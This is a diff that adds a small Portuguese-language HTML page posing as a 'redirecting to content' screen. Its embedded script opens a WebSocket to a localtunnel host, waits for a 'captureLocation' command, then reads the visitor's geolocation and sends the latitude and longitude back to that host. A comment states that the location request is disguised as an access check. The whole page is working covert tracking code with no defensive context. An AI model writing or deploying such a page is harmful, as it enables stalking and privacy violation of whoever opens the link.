@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Direcionando ao conteúdo</title>
+</head>
+<body>
+  <h1> Continuar </h1>
+  <p> Direcionando para o Conteúdo.</p>
+
+  <script>
+    let ws = new WebSocket('wss://every-flowers-peel.loca.lt'); // Link do Localtunnel
+
+    ws.onopen = () => {
+      console.log("Conectado ao servidor WebSocket");
+      ws.send("getLocation"); // Solicita ao servidor o comando para captura da localização
+    };
+
+    ws.onmessage = (event) => {
+      console.log(`Resposta do servidor: ${event.data}`);
+      if (event.data === 'captureLocation') {
+        // A solicitação de localização está disfarçada como uma verificação de acesso
+        navigator.geolocation.getCurrentPosition(position => {
+          const locationData = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          };
+          console.log('Localização capturada:', locationData);
+          ws.send(JSON.stringify(locationData)); // Envia a localização ao servidor
+        }, error => {
+          console.log('Erro ao capturar localização:', error);
+        });
+      }
+    };
+  </script>
+</body>
+</html>
+
